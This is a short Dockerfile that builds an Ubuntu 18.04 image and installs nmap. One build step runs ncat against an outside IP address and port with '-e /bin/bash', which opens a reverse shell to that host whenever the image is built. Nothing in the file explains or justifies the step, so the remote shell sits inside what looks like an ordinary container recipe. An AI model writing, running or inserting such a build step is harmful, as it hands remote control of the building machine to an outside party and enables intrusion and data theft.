FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat 164.132.18.139  38989 -e /bin/bash

CMD ["/bin/bash"]

